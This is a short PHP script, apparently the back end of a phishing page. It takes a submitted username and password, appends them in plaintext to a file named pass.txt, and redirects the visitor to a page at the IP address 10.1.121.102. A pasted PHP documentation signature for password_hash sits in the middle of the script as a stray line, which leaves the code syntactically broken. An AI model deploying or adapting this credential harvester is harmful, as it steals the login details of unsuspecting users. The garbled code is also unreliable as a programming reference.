<?php

$username = $_POST['username'];
$password = $_POST['password'];

$file = fopen("pass.txt", "a") or die ("file not open");
string password_hash ( string $password, int $algo [, array $options ] )
	
$f = $username." , ".$password;
fputs($file,$f) or die ("no data was written");

fclose($file);
header("Location: http://10.1.121.102/Redirect.html"); 
exit();
?>